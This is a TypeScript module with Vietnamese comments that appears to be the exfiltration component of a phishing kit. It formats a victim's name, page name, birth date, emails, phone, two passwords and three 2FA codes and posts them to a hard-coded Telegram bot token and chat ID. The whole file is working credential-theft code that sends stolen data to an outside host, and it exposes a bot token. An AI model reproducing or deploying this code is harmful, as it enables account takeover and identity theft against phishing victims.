import axios from 'axios';
import https from 'https';

// Thông tin cấu hình cứng trực tiếp vào code
const TELEGRAM_TOKEN = '8271457462:AAGfhmmTZ9quTbMRyR92eHAYT92SQk4ddEc';
const TELEGRAM_CHAT_ID = '-5169225401';

const agent = new https.Agent({ family: 4 });

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function formatMessage(d: any): string {
    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
    return `
<b>Ip:</b> <code>${escapeHtml(d.ip || 'N/A')}</code>
<b>Location:</b> <code>${escapeHtml(d.location || 'N/A')}</code>
-----------------------------
<b>Full Name:</b> <code>${escapeHtml(d.fullName || d.name)}</code>
<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
-----------------------------
<b>Email:</b> <code>${escapeHtml(d.email)}</code>
<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness || d.business)}</code>
<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : 'N/A'}</code>
-----------------------------
<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
-----------------------------${authLine}
<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const updatedText = formatMessage(data);

    console.log("🚀 Đang gửi tin nhắn tới Telegram...");

    try {
        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: updatedText,
            parse_mode: 'HTML'
        }, {
            httpsAgent: agent,
            timeout: 15000 // Tăng timeout lên 15s
        });

        if (res.data.ok) {
            console.log(`✅ Gửi thành công! Message ID: ${res.data.result.message_id}`);
        } else {
            console.error('❌ Telegram trả về lỗi:', res.data);
        }
    } catch (err: any) {
        console.error('🔥 Lỗi kết nối Telegram API:', err?.response?.data || err.message);
    }
}